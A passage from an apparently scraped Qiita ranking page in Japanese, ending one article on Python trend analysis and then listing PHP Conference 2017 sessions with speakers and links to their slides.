<p><a href="https://camo.qiitausercontent.com/835efd0fba1318a0489edd31e57c52c26c255be5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133343730342f63393966393063322d316239612d386432632d313432662d3333633432323033626662322e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/835efd0fba1318a0489edd31e57c52c26c255be5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133343730342f63393966393063322d316239612d386432632d313432662d3333633432323033626662322e6a706567" alt="2017.JPG" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/134704/c99f90c2-1b9a-8d2c-142f-33c42203bfb2.jpeg"></a></p>

<ul>
<li>こちらが2006年度の結果。明らかに使われ方が違いますね</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/d6cd23c54312fc62ee91859bb173d347dd8ae820/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133343730342f62373164366236332d303238642d396234662d346531662d3739616439653935343938372e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d6cd23c54312fc62ee91859bb173d347dd8ae820/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133343730342f62373164366236332d303238642d396234662d346531662d3739616439653935343938372e6a706567" alt="Ruby.JPG" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/134704/b71d6b63-028d-9b4f-4e1f-79ad9e954987.jpeg"></a></p>

<h1>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h1>

<p>【Python】スクレイピング→データ収集→整形→分析までの流れを初心者向けにまとめておく ～Pythonに関するはてな記事を10年分スクレイピングし、Pythonトレンド分析を実際にやってみた～</p>

<p><a href="https://review-of-my-life.blogspot.jp/2017/10/python-web-scraping-data-collection-analysis.html" class="autolink" rel="nofollow noopener" target="_blank">https://review-of-my-life.blogspot.jp/2017/10/python-web-scraping-data-collection-analysis.html</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">72位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>142</kbd>
		<a target="_blank" href="https://qiita.com/hikarut/items/9029566b05c25d235f78">PHPカンファレンス2017 講演資料まとめ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-08<br />19:20:21</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/110485.html">hikarut</a>(34件の記事)<br />(Yahoo Japan, EGG SYSTEM Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/110485/profile-images/1474383172">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[PHPカンファレンス]</b> <b>[phpcon]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>4年連続4回目のPHPカンファレンスに参加したのでまとめます！<br>
足りない情報とかあるので必要なら追記していただけると助かります <img alt=":pray:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f64f.png" title=":pray:" width="20"> </p>

<h1>
<span id="phpカンファレンス2017" class="fragment"></span><a href="#php%E3%82%AB%E3%83%B3%E3%83%95%E3%82%A1%E3%83%AC%E3%83%B3%E3%82%B92017"><i class="fa fa-link"></i></a>PHPカンファレンス2017</h1>

<ul>
<li><a href="http://phpcon.php.gr.jp/2017/" rel="nofollow noopener" target="_blank">phpcon2017</a></li>
<li><a href="http://realtime.search.yahoo.co.jp/search?p=%23phpcon2017" rel="nofollow noopener" target="_blank">twitter #phpcon2017</a></li>
<li>日時：2017年10月8日(日) 10:00〜17:00</li>
<li>場所：大田区産業プラザ PiO</li>
<li>タイムスケジュール：<a href="https://joind.in/event/japan-php-conference-2017/schedule/grid" class="autolink" rel="nofollow noopener" target="_blank">https://joind.in/event/japan-php-conference-2017/schedule/grid</a>
</li>
</ul>

<h1>
<span id="講演" class="fragment"></span><a href="#%E8%AC%9B%E6%BC%94"><i class="fa fa-link"></i></a>講演</h1>

<h2>
<span id="session01-phpの今とこれから2017" class="fragment"></span><a href="#session01-php%E3%81%AE%E4%BB%8A%E3%81%A8%E3%81%93%E3%82%8C%E3%81%8B%E3%82%892017"><i class="fa fa-link"></i></a>session01: PHPの今とこれから2017</h2>

<p>スピーカー：廣川 類(日本PHPユーザ会)<br>
資料：<br>
togetter：<br>
その他資料：<a href="https://qiita.com/Yorinton/items/4bddd7dddd262cdb51ea" id="reference-6775add0229f867134b7">PHPカンファレンス2017@東京_メモ①PHPの今とこれから</a></p>

<p>過去の資料</p>

<ul>
<li><a href="http://www.slideshare.net/hirokawa/php2016-68096757" rel="nofollow noopener" target="_blank">PHPの今とこれから2016</a></li>
<li><a href="http://www.slideshare.net/hirokawa/php2015-53467590" rel="nofollow noopener" target="_blank">PHPの今とこれから2015</a></li>
<li><a href="http://www.slideshare.net/hirokawa/php2014-40144066" rel="nofollow noopener" target="_blank">PHPの今とこれから2014</a></li>
<li><a href="http://www.slideshare.net/hirokawa/php-con2013ub" rel="nofollow noopener" target="_blank">PHPの今とこれから2013</a></li>
</ul>

<h2>
<span id="session02-apache-kafkaによるスケーラブルアプリケーション開発" class="fragment"></span><a href="#session02-apache-kafka%E3%81%AB%E3%82%88%E3%82%8B%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%A9%E3%83%96%E3%83%AB%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/ytake/apache-kafkaniyorusukeraburu-apurikesiyonkai-fa" rel="nofollow noopener" target="_blank">session02: Apache Kafkaによるスケーラブルアプリケーション開発</a>
</h2>

<p>スピーカー：Yuuki Takezawa<br>
資料：<a href="https://speakerdeck.com/ytake/apache-kafkaniyorusukeraburu-apurikesiyonkai-fa" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/ytake/apache-kafkaniyorusukeraburu-apurikesiyonkai-fa</a></p>

<h2>
<span id="session03-型を意識したphpアプリケーション開発" class="fragment"></span><a href="#session03-%E5%9E%8B%E3%82%92%E6%84%8F%E8%AD%98%E3%81%97%E3%81%9Fphp%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/shin1x1/xing-woyi-shi-sitaphpapurikesiyonkai-fa" rel="nofollow noopener" target="_blank">session03: 型を意識したPHPアプリケーション開発</a>
</h2>

<p>スピーカー：Masashi Shinbara<br>
資料：<a href="https://speakerdeck.com/shin1x1/xing-woyi-shi-sitaphpapurikesiyonkai-fa" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/shin1x1/xing-woyi-shi-sitaphpapurikesiyonkai-fa</a></p>

<h2>
<span id="session04-著名phpアプリの脆弱性に学ぶセキュアコーディングの原則" class="fragment"></span><a href="#session04-%E8%91%97%E5%90%8Dphp%E3%82%A2%E3%83%97%E3%83%AA%E3%81%AE%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AB%E5%AD%A6%E3%81%B6%E3%82%BB%E3%82%AD%E3%83%A5%E3%82%A2%E3%82%B3%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%AE%E5%8E%9F%E5%89%87"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/ockeghem/php-conference-2017" rel="nofollow noopener" target="_blank">session04: 著名PHPアプリの脆弱性に学ぶセキュアコーディングの原則</a>
</h2>

<p>スピーカー：EGセキュアソリューションズ株式会社 代表取締役 徳丸 浩<br>
資料：<a href="https://www.slideshare.net/ockeghem/php-conference-2017" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/ockeghem/php-conference-2017</a></p>

<h2>
<span id="session05-片手間mysqlチューニング戦略" class="fragment"></span><a href="#session05-%E7%89%87%E6%89%8B%E9%96%93mysql%E3%83%81%E3%83%A5%E3%83%BC%E3%83%8B%E3%83%B3%E3%82%B0%E6%88%A6%E7%95%A5"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/secret/NuNbliXqteJnSQ" rel="nofollow noopener" target="_blank">session05: 片手間MySQLチューニング戦略</a>
</h2>

<p>スピーカー：日本MySQLユーザ会 yoku0825<br>
資料：<a href="https://www.slideshare.net/secret/NuNbliXqteJnSQ" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/secret/NuNbliXqteJnSQ</a></p>

<h2>
<span id="session06-大規模webサイトのurl刷新の方針と実装" class="fragment"></span><a href="#session06-%E5%A4%A7%E8%A6%8F%E6%A8%A1web%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AEurl%E5%88%B7%E6%96%B0%E3%81%AE%E6%96%B9%E9%87%9D%E3%81%A8%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>session06: 大規模WebサイトのURL刷新の方針と実装</h2>

<p>スピーカー：ピクシブ株式会社 山際康貴<br>
資料：</p>

<h2>
<span id="session07-phpによるwebアプリ脆弱性体験トレーニング" class="fragment"></span><a href="#session07-php%E3%81%AB%E3%82%88%E3%82%8Bweb%E3%82%A2%E3%83%97%E3%83%AA%E8%84%86%E5%BC%B1%E6%80%A7%E4%BD%93%E9%A8%93%E3%83%88%E3%83%AC%E3%83%BC%E3%83%8B%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>session07: PHPによるWebアプリ脆弱性体験トレーニング</h2>

<p>スピーカー：竹迫 良範（高知工業高等専門学校 客員准教授）<br>
資料：</p>

<h2>
<span id="session08-グラブル流運用術-1700万人を満足させるためのシステム構成phpプログラムの考え方" class="fragment"></span><a href="#session08-%E3%82%B0%E3%83%A9%E3%83%96%E3%83%AB%E6%B5%81%E9%81%8B%E7%94%A8%E8%A1%93-1700%E4%B8%87%E4%BA%BA%E3%82%92%E6%BA%80%E8%B6%B3%E3%81%95%E3%81%9B%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AE%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E6%A7%8B%E6%88%90php%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E8%80%83%E3%81%88%E6%96%B9"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/cygames/guraburuliu-yun-yong-shu-1700mo-ren-woman-zu-saserutamefalsesisutemugou-cheng-phppuroguramufalsekao-efang" rel="nofollow noopener" target="_blank">session08: グラブル流運用術 ~1700万人を満足させるためのシステム構成、PHPプログラムの考え方~</a>
</h2>

<p>スピーカー：株式会社Cygames サーバーサイドエンジニア 石田 健太<br>
資料：<a href="https://speakerdeck.com/cygames/guraburuliu-yun-yong-shu-1700mo-ren-woman-zu-saserutamefalsesisutemugou-cheng-phppuroguramufalsekao-efang" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/cygames/guraburuliu-yun-yong-shu-1700mo-ren-woman-zu-saserutamefalsesisutemugou-cheng-phppuroguramufalsekao-efang</a></p>

<h2>
<span id="session09-現代におけるプロダクト開発とphpを選定するワケ" class="fragment"></span><a href="#session09-%E7%8F%BE%E4%BB%A3%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E3%83%97%E3%83%AD%E3%83%80%E3%82%AF%E3%83%88%E9%96%8B%E7%99%BA%E3%81%A8php%E3%82%92%E9%81%B8%E5%AE%9A%E3%81%99%E3%82%8B%E3%83%AF%E3%82%B1"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/potato4d/xian-dai-niokerupurodakutokai-fa-tophpwoxuan-ding-suruwake-at-tokyo-number-phpcon2017" rel="nofollow noopener" target="_blank">session09: 現代におけるプロダクト開発とPHPを選定するワケ</a>
</h2>

<p>スピーカー：花谷拓磨<br>
資料：<a href="https://speakerdeck.com/potato4d/xian-dai-niokerupurodakutokai-fa-tophpwoxuan-ding-suruwake-at-tokyo-number-phpcon2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/potato4d/xian-dai-niokerupurodakutokai-fa-tophpwoxuan-ding-suruwake-at-tokyo-number-phpcon2017</a></p>

<h2>
<span id="session12-openid-connectを通じてwebアプリケーション技術とphpによる実装を学ぼう" class="fragment"></span><a href="#session12-openid-connect%E3%82%92%E9%80%9A%E3%81%98%E3%81%A6web%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E6%8A%80%E8%A1%93%E3%81%A8php%E3%81%AB%E3%82%88%E3%82%8B%E5%AE%9F%E8%A3%85%E3%82%92%E5%AD%A6%E3%81%BC%E3%81%86"><i class="fa fa-link"></i></a>session12: OpenID Connectを通じてWebアプリケーション技術とPHPによる実装を学ぼう</h2>

<p>スピーカー：倉林 雅<br>
資料：</p>

<h2>
<span id="session13-serverless-frameworkでawsフルマネージドなツールをいくつか作って得たアーキテクチャ設計の知見" class="fragment"></span><a href="#session13-serverless-framework%E3%81%A7aws%E3%83%95%E3%83%AB%E3%83%9E%E3%83%8D%E3%83%BC%E3%82%B8%E3%83%89%E3%81%AA%E3%83%84%E3%83%BC%E3%83%AB%E3%82%92%E3%81%84%E3%81%8F%E3%81%A4%E3%81%8B%E4%BD%9C%E3%81%A3%E3%81%A6%E5%BE%97%E3%81%9F%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E8%A8%AD%E8%A8%88%E3%81%AE%E7%9F%A5%E8%A6%8B"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/k1low/php-conference-2017" rel="nofollow noopener" target="_blank">session13: Serverless FrameworkでAWSフルマネージドなツールをいくつか作って得たアーキテクチャ設計の知見</a>
</h2>

<p>スピーカー：Ken'ichirou Oyama (Fusic Co.,Ltd.)<br>
資料：<a href="https://speakerdeck.com/k1low/php-conference-2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/k1low/php-conference-2017</a></p>

<h2>
<span id="session14-広告配信管理システムを支えるphp--レガシーシステムからの段階的移行戦略" class="fragment"></span><a href="#session14-%E5%BA%83%E5%91%8A%E9%85%8D%E4%BF%A1%E7%AE%A1%E7%90%86%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%92%E6%94%AF%E3%81%88%E3%82%8Bphp--%E3%83%AC%E3%82%AC%E3%82%B7%E3%83%BC%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%8B%E3%82%89%E3%81%AE%E6%AE%B5%E9%9A%8E%E7%9A%84%E7%A7%BB%E8%A1%8C%E6%88%A6%E7%95%A5"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/suzuken/phpcon2017" rel="nofollow noopener" target="_blank">session14: 広告配信管理システムを支えるPHP ~ レガシーシステムからの段階的移行戦略</a>
</h2>

<p>スピーカー：株式会社VOYAGE GROUP 鈴木健太 (<a href="/suzu_v" class="user-mention js-hovercard" title="suzu_v" data-hovercard-target-type="user" data-hovercard-target-name="suzu_v">@suzu_v</a>)<br>
資料：<a href="https://speakerdeck.com/suzuken/phpcon2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/suzuken/phpcon2017</a></p>

<h2>
<span id="session15-opcache-の最適化器の今" class="fragment"></span><a href="#session15-opcache-%E3%81%AE%E6%9C%80%E9%81%A9%E5%8C%96%E5%99%A8%E3%81%AE%E4%BB%8A"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/y-uti/opcache-80570081" rel="nofollow noopener" target="_blank">session15: OPcache の最適化器の今</a>
</h2>

<p>スピーカー：Yuji Uchiyama<br>
資料：<a href="https://www.slideshare.net/y-uti/opcache-80570081" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/y-uti/opcache-80570081</a><br>
その他資料：<a href="http://zoe3.hateblo.jp/entry/2017/10/08/112015" class="autolink" rel="nofollow noopener" target="_blank">http://zoe3.hateblo.jp/entry/2017/10/08/112015</a></p>

<h2>
<span id="session16-php-version-up-と-aws-への移行" class="fragment"></span><a href="#session16-php-version-up-%E3%81%A8-aws-%E3%81%B8%E3%81%AE%E7%A7%BB%E8%A1%8C"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/greetech/php-version-up-aws" rel="nofollow noopener" target="_blank">session16: PHP Version Up と AWS への移行</a>
</h2>

<p>スピーカー：グリー株式会社 吉本 将宣<br>
資料：<a href="https://www.slideshare.net/greetech/php-version-up-aws" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/greetech/php-version-up-aws</a></p>

<h2>
<span id="session17-運用追加開発しづらいphpアプリケーションに未来を与える方法" class="fragment"></span><a href="#session17-%E9%81%8B%E7%94%A8%E8%BF%BD%E5%8A%A0%E9%96%8B%E7%99%BA%E3%81%97%E3%81%A5%E3%82%89%E3%81%84php%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E6%9C%AA%E6%9D%A5%E3%82%92%E4%B8%8E%E3%81%88%E3%82%8B%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/arata/yun-yong-zhui-jia-kai-fa-siduraiphpapurikesiyonniwei-lai-woyu-erufang-fa" rel="nofollow noopener" target="_blank">session17: 運用、追加開発しづらいPHPアプリケーションに未来を与える方法</a>
</h2>

<p>スピーカー：株式会社VOYAGE GROUP リードエンジニア 田中 改<br>
資料：<a href="https://speakerdeck.com/arata/yun-yong-zhui-jia-kai-fa-siduraiphpapurikesiyonniwei-lai-woyu-erufang-fa" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/arata/yun-yong-zhui-jia-kai-fa-siduraiphpapurikesiyonniwei-lai-woyu-erufang-fa</a></p>

<h2>
<span id="session18-php初心者セッション" class="fragment"></span><a href="#session18-php%E5%88%9D%E5%BF%83%E8%80%85%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/kashioka/phpchu-xin-zhe-setusiyon2017" rel="nofollow noopener" target="_blank">session18: PHP初心者セッション</a>
</h2>

<p>スピーカー：Hideo Kashioka<br>
資料：<a href="https://speakerdeck.com/kashioka/phpchu-xin-zhe-setusiyon2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/kashioka/phpchu-xin-zhe-setusiyon2017</a></p>

<h2>
<span id="session20-realtime-database-messaging-with-firebase" class="fragment"></span><a href="#session20-realtime-database-messaging-with-firebase"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/sota1235/realtime-messaging-with-firebase-number-phpcon2017" rel="nofollow noopener" target="_blank">session20: Realtime Database Messaging with Firebase</a>
</h2>

<p>スピーカー：Sota Sugiura<br>
資料：<a href="https://speakerdeck.com/sota1235/realtime-messaging-with-firebase-number-phpcon2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/sota1235/realtime-messaging-with-firebase-number-phpcon2017</a></p>

<h2>
<span id="session21-php-と-シグナル処理その裏側" class="fragment"></span><a href="#session21-php-%E3%81%A8-%E3%82%B7%E3%82%B0%E3%83%8A%E3%83%AB%E5%87%A6%E7%90%86%E3%81%9D%E3%81%AE%E8%A3%8F%E5%81%B4"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/do_aki/20171008-signal-onphp" rel="nofollow noopener" target="_blank">session21: php と シグナル処理、その裏側</a>
</h2>

<p>スピーカー：do_aki<br>
資料：<a href="https://www.slideshare.net/do_aki/20171008-signal-onphp" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/do_aki/20171008-signal-onphp</a></p>

<h2>
<span id="session22-できるphp7アップグレード" class="fragment"></span><a href="#session22-%E3%81%A7%E3%81%8D%E3%82%8Bphp7%E3%82%A2%E3%83%83%E3%83%97%E3%82%B0%E3%83%AC%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/hypermkt/php7-upgrade" rel="nofollow noopener" target="_blank">session22: できるPHP7アップグレード</a>
</h2>

<p>スピーカー：Makoto Chiba<br>
資料：<a href="https://speakerdeck.com/hypermkt/php7-upgrade" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/hypermkt/php7-upgrade</a></p>

<h2>
<span id="session23-lancersのバージョンアップ施策について" class="fragment"></span><a href="#session23-lancers%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%82%A2%E3%83%83%E3%83%97%E6%96%BD%E7%AD%96%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/shigemasaakiyama/cakephp-80574005" rel="nofollow noopener" target="_blank">session23: Lancersのバージョンアップ施策について</a>
</h2>

<p>スピーカー：秋山茂昌 / ランサーズ株式会社<br>
資料：<a href="https://www.slideshare.net/shigemasaakiyama/cakephp-80574005" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/shigemasaakiyama/cakephp-80574005</a></p>

<h2>
<span id="session24-robo-を使ったモダンなタスク管理と自動化" class="fragment"></span><a href="#session24-robo-%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%9F%E3%83%A2%E3%83%80%E3%83%B3%E3%81%AA%E3%82%BF%E3%82%B9%E3%82%AF%E7%AE%A1%E7%90%86%E3%81%A8%E8%87%AA%E5%8B%95%E5%8C%96"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/sizuhiko/php-conference-2017" rel="nofollow noopener" target="_blank">session24: Robo を使ったモダンなタスク管理と自動化</a>
</h2>

<p>スピーカー：Kenichirou Kishida<br>
資料：<a href="https://speakerdeck.com/sizuhiko/php-conference-2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/sizuhiko/php-conference-2017</a></p>

<h2>
<span id="session25-postgresqlとpgroongaで作るphpマニュアル高速全文検索システム" class="fragment"></span><a href="#session25-postgresql%E3%81%A8pgroonga%E3%81%A7%E4%BD%9C%E3%82%8Bphp%E3%83%9E%E3%83%8B%E3%83%A5%E3%82%A2%E3%83%AB%E9%AB%98%E9%80%9F%E5%85%A8%E6%96%87%E6%A4%9C%E7%B4%A2%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0"><i class="fa fa-link"></i></a><a href="https://slide.rabbit-shocker.org/authors/kou/php-conference-2017/" rel="nofollow noopener" target="_blank">session25: PostgreSQLとPGroongaで作るPHPマニュアル高速全文検索システム</a>
</h2>

<p>スピーカー：須藤功平<br>
資料：<a href="https://slide.rabbit-shocker.org/authors/kou/php-conference-2017/" class="autolink" rel="nofollow noopener" target="_blank">https://slide.rabbit-shocker.org/authors/kou/php-conference-2017/</a></p>

<h2>
<span id="session26-ここで差がつくエラー処理" class="fragment"></span><a href="#session26-%E3%81%93%E3%81%93%E3%81%A7%E5%B7%AE%E3%81%8C%E3%81%A4%E3%81%8F%E3%82%A8%E3%83%A9%E3%83%BC%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a>session26: <a href="http://niconare.nicovideo.jp/watch/kn2630" rel="nofollow noopener" target="_blank">ここで差がつくエラー処理</a>
</h2>

<p>スピーカー：ピクシブ株式会社 うさみけんた <a href="/tadsan" class="user-mention js-hovercard" title="tadsan" data-hovercard-target-type="user" data-hovercard-target-name="tadsan">@tadsan</a><br>
資料：<a href="http://niconare.nicovideo.jp/watch/kn2630" class="autolink" rel="nofollow noopener" target="_blank">http://niconare.nicovideo.jp/watch/kn2630</a><br>
その他資料：<a href="https://speakerdeck.com/hirak/php-error-and-exception" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/hirak/php-error-and-exception</a></p>

<h2>
<span id="session27-dockerでphpアプリケーションを本番リリースするまで" class="fragment"></span><a href="#session27-docker%E3%81%A7php%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E6%9C%AC%E7%95%AA%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9%E3%81%99%E3%82%8B%E3%81%BE%E3%81%A7"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/hanhan1978/dockerdeapurikesiyonwo-ben-fan-ririsusurumade" rel="nofollow noopener" target="_blank">session27: DockerでPHPアプリケーションを本番リリースするまで</a>
</h2>

<p>スピーカー：Ryo Tomidokoro<br>
資料：<a href="https://speakerdeck.com/hanhan1978/dockerdeapurikesiyonwo-ben-fan-ririsusurumade" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/hanhan1978/dockerdeapurikesiyonwo-ben-fan-ririsusurumade</a></p>

<h2>
<span id="session28-開発環境をdockerにしてみませんか" class="fragment"></span><a href="#session28-%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%82%92docker%E3%81%AB%E3%81%97%E3%81%A6%E3%81%BF%E3%81%BE%E3%81%9B%E3%82%93%E3%81%8B"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/kunit/number-phpcon2017" rel="nofollow noopener" target="_blank">session28: 開発環境をDockerにしてみませんか？</a>
</h2>

<p>スピーカー：necomori LLC 高橋邦彦(kunit)<br>
資料：<a href="https://speakerdeck.com/kunit/number-phpcon2017" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/kunit/number-phpcon2017</a></p>

<h2>
<span id="session29-phpでもserverless-framework" class="fragment"></span><a href="#session29-php%E3%81%A7%E3%82%82serverless-framework"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/kaz29/phptemoserverless-framework" rel="nofollow noopener" target="_blank">session29: PHPでもserverless framework!?</a>
</h2>

<p>スピーカー：Kazuhiro Watanabe<br>
資料：<a href="https://speakerdeck.com/kaz29/phptemoserverless-framework" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/kaz29/phptemoserverless-framework</a></p>

<h2>
<span id="session30-laravelで作る分析環境" class="fragment"></span><a href="#session30-laravel%E3%81%A7%E4%BD%9C%E3%82%8B%E5%88%86%E6%9E%90%E7%92%B0%E5%A2%83"><i class="fa fa-link"></i></a>session30: Laravelで作る分析環境</h2>

<p>スピーカー：河部祐里<br>
※講演は中止になりました</p>

<h2>
<span id="session31-kuduを使用したkpi分析システムの話" class="fragment"></span><a href="#session31-kudu%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9Fkpi%E5%88%86%E6%9E%90%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AE%E8%A9%B1"><i class="fa fa-link"></i></a>session31: kuduを使用したKPI分析システムの話</h2>

<p>スピーカー：DMM.comラボ 野口裕也<br>
資料：</p>

<h2>
<span id="session32-phpアプリの品質をある程度保つために出来る事組織編" class="fragment"></span><a href="#session32-php%E3%82%A2%E3%83%97%E3%83%AA%E3%81%AE%E5%93%81%E8%B3%AA%E3%82%92%E3%81%82%E3%82%8B%E7%A8%8B%E5%BA%A6%E4%BF%9D%E3%81%A4%E3%81%9F%E3%82%81%E3%81%AB%E5%87%BA%E6%9D%A5%E3%82%8B%E4%BA%8B%E7%B5%84%E7%B9%94%E7%B7%A8"><i class="fa fa-link"></i></a><a href="https://www.slideshare.net/MiuraKatsu/php-80570739" rel="nofollow noopener" target="_blank">session32: PHPアプリの品質を(ある程度)保つために出来る事〜組織編〜</a>
</h2>

<p>スピーカー：株式会社サイバード 三浦克浩<br>
資料：<a href="https://www.slideshare.net/MiuraKatsu/php-80570739" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/MiuraKatsu/php-80570739</a></p>

<h2>
<span id="session33-wordpress-rest-api攻略" class="fragment"></span><a href="#session33-wordpress-rest-api%E6%94%BB%E7%95%A5"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/miya0001/wp-apigong-lue" rel="nofollow noopener" target="_blank">session33: WordPress REST API攻略</a>
</h2>

<p>スピーカー：タロスカイ株式会社 宮内 隆行<br>
資料：<a href="https://speakerdeck.com/miya0001/wp-apigong-lue" class="autolink" rel="nofollow noopener" target="_blank">https://speakerdeck.com/miya0001/wp-apigong-lue</a></p>

<h2>
<span id="session34-モバイルページを爆速にlaravelで実現するamp対応の自動化" class="fragment"></span><a href="#session34-%E3%83%A2%E3%83%90%E3%82%A4%E3%83%AB%E3%83%9A%E3%83%BC%E3%82%B8%E3%82%92%E7%88%86%E9%80%9F%E3%81%ABlaravel%E3%81%A7%E5%AE%9F%E7%8F%BE%E3%81%99%E3%82%8Bamp%E5%AF%BE%E5%BF%9C%E3%81%AE%E8%87%AA%E5%8B%95%E5%8C%96"><i class="fa fa-link"></i></a><a href="https://speakerdeck.com/yaizuuuu/mobairupeziwobao-su-ni-laraveldeshi-xian-suruampdui-ying-falsezi-dong-hua-number-phpcon2017" rel="nofollow noopener" target="_blank">session34: モバイルページを爆速に~Laravelで実現するAMP対応の自動化~</a>
</h2>

<p>スピーカー：株式会社イノベーション　小柳津裕真<br>
